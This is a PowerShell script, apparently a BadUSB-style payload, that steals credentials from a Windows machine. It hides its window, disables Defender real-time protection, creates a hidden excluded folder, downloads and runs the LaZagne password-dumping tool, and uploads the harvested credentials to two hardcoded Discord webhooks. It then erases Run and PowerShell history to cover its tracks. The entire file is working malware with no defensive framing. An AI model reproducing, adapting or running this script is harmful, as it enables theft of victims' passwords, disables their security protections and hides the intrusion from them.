# Disable sleep on lid close (powercfg settings)
powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_BUTTONS LIDACTION 0
powercfg /SETACTIVE SCHEME_CURRENT

# Run the main script as a background job
Start-Job -ScriptBlock {
    # Hide Powershell Window
    function Set-WindowState {
        [CmdletBinding(DefaultParameterSetName = 'InputObject')]
        param(
            [Parameter(Position = 0, Mandatory = $true, ValueFromPipeline = $true)]
            [Object[]] $InputObject,

            [Parameter(Position = 1)]
            [ValidateSet('FORCEMINIMIZE', 'HIDE', 'MAXIMIZE', 'MINIMIZE', 'RESTORE',
                         'SHOW', 'SHOWDEFAULT', 'SHOWMAXIMIZED', 'SHOWMINIMIZED',
                         'SHOWMINNOACTIVE', 'SHOWNA', 'SHOWNOACTIVATE', 'SHOWNORMAL')]
            [string] $State = 'SHOW',
            [switch] $SuppressErrors = $false,
            [switch] $SetForegroundWindow = $false
        )

        Begin {
            $WindowStates = @{
                'FORCEMINIMIZE' = 11
                'HIDE'          = 0
                'MAXIMIZE'      = 3
                'MINIMIZE'      = 6
                'RESTORE'       = 9
                'SHOW'          = 5
                'SHOWDEFAULT'   = 10
                'SHOWMAXIMIZED' = 3
                'SHOWMINIMIZED' = 2
                'SHOWMINNOACTIVE' = 7
                'SHOWNA'        = 8
                'SHOWNOACTIVATE' = 4
                'SHOWNORMAL'    = 1
            }

            $Win32ShowWindowAsync = Add-Type -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
[DllImport("user32.dll", SetLastError = true)]
public static extern bool SetForegroundWindow(IntPtr hWnd);
'@ -Name "Win32ShowWindowAsync" -Namespace Win32Functions -PassThru

            if (!$global:MainWindowHandles) {
                $global:MainWindowHandles = @{ }
            }
        }

        Process {
            foreach ($process in $InputObject) {
                $handle = $process.MainWindowHandle

                if ($handle -eq 0 -and $global:MainWindowHandles.ContainsKey($process.Id)) {
                    $handle = $global:MainWindowHandles[$process.Id]
                }

                if ($handle -eq 0) {
                    if (-not $SuppressErrors) {
                        Write-Error "Main Window handle is '0'"
                    }
                    continue
                }

                $global:MainWindowHandles[$process.Id] = $handle

                $Win32ShowWindowAsync::ShowWindowAsync($handle, $WindowStates[$State]) | Out-Null
                if ($SetForegroundWindow) {
                    $Win32ShowWindowAsync::SetForegroundWindow($handle) | Out-Null
                }
            }
        }
    }

    Set-Alias -Name 'Set-WindowStyle' -Value 'Set-WindowState'

    # Disable real-time protection
    Set-MpPreference -DisableRealtimeMonitoring $true

    # Minimize PowerShell window
    Get-Process -ID $PID | Set-WindowState -State HIDE

    # Create a tmp directory in the Downloads folder
    $dir = "C:\Users\$env:UserName\Downloads\tmp"
    New-Item -ItemType Directory -Path $dir

    # Add an exception to Windows Defender for the tmp directory
    Add-MpPreference -ExclusionPath $dir

    # Hide the directory
    $hide = Get-Item $dir -Force
    $hide.attributes = 'Hidden'

    # Download the executable
    Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "$dir\lazagne.exe"

    # Execute the executable and save output to a file
    & "$dir\lazagne.exe" all > "$dir\output.txt"

    # Function to upload data to Discord
    function Grab-Data {
        [CmdletBinding()]
        param (
            [parameter(Position=0,Mandatory=$False)]
            [string]$file,
            [parameter(Position=1,Mandatory=$False)]
            [string]$text
        )

        $hookurl = 'https://discord.com/api/webhooks/1156861787602436147/rtoA_Id9Yc9TGm7lR9MGWWqfryBBvS9mRpShIdcvBw0AVOzwFvEk-UlOQ3bFRnKbKGad'

        $Body = @{
            'username' = "Gegevens van " + $env:username
            'content'  = $text
        }

        if (-not ([string]::IsNullOrEmpty($text))) {
            Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
        }

        if (-not ([string]::IsNullOrEmpty($file))) {
            curl.exe -F "file1=@$file" $hookurl
        }
    }

    Grab-Data -text "Met vriendelijke groet, Dhr. Haak" -file "$dir\output.txt"

    # Function to post data to another webhook
    function Post-Data {
        [CmdletBinding()]
        param (
            [parameter(Position=0,Mandatory=$False)]
            [string]$file,
            [parameter(Position=1,Mandatory=$False)]
            [string]$text
        )

        $hookurl = 'https://discord.com/api/webhooks/1156610163462131783/0f1XmHXMhX3kZQcTK4iWg7eCo9SnBh3Vjj9ULk-Dn2iW9U7QKl7dRrc2YBYkpoKPzgTE'

        $Body = @{
            'username' = "Gegevens van " + $env:username
            'content'  = $text
        }

        if (-not ([string]::IsNullOrEmpty($text))) {
            Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
        }

        if (-not ([string]::IsNullOrEmpty($file))) {
            curl.exe -F "file1=@$file" $hookurl
        }
    }

    Post-Data -text "Met vriendelijke groet, Dhr. Haak" -file "$dir\output.txt"

    # Clean up
    Remove-Item -Path C:\Users\$env:UserName\Downloads\tmp -Recurse -Force
    Set-MpPreference -DisableRealtimeMonitoring $false
    Remove-MpPreference -ExclusionPath $dir

    # Clear Windows Run history
    Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force
    New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Force

    # Clear PowerShell history
    Remove-Item -Path (Get-PSReadlineOption).HistorySavePath -Force
    New-Item -ItemType File -Path (Get-PSReadlineOption).HistorySavePath -Force

    # Remove the script from the system
    Clear-History
}

# Wait for 2 minutes (main script runs in parallel)
Start-Sleep -Seconds 120

# Re-enable sleep on lid close after 2 minutes
powercfg /SETACVALUEINDEX SCHEME_CURRENT SUB_BUTTONS LIDACTION 1
powercfg /SETACTIVE SCHEME_CURRENT
